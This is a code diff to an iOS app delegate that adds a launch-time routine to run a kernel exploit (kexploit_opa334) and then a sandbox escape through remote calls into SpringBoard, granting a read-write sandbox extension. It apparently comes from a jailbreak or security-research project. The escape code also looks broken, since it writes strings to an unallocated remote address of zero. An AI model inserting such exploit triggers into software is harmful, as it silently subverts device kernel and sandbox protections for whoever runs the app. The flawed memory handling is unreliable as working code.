@@ -6,6 +6,12 @@
 //
 
 #import "AppDelegate.h"
+#import "../kexploit/kexploit_opa334.h"
+#import "../utils/sandbox.h"
+#import "../research/sandbox_research.h"
+#import "../utils/process.h"
+#import "../TaskRop/RemoteCall.h"
+#import "LogTextView.h"
 
 @interface AppDelegate ()
 
@@ -16,6 +22,33 @@
 
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
     // Override point for customization after application launch.
+    
+    // Initialize logging
+    log_init();
+    
+    // Run exploit on app launch
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        NSLog(@"Running kernel exploit...");
+        kexploit_opa334();
+        NSLog(@"Kernel exploit completed");
+        
+        // Run sandbox escape on app launch
+        NSLog(@"Running sandbox escape...");
+        const char* target = "SpringBoard";
+        init_remote_call(target, false);
+        
+        uint64_t memRemote = 0;
+        uint64_t pathRemote = memRemote;
+        remote_writeStr(pathRemote, "/");
+        
+        const char* appSandboxReadExt = "com.apple.app-sandbox.read-write";
+        uint64_t sandboxExtensionEntry = memRemote + 0x100;
+        remote_writeStr(sandboxExtensionEntry, appSandboxReadExt);
+        
+        destroy_remote_call();
+        NSLog(@"Sandbox escape completed");
+    });
+    
     return YES;
 }
 
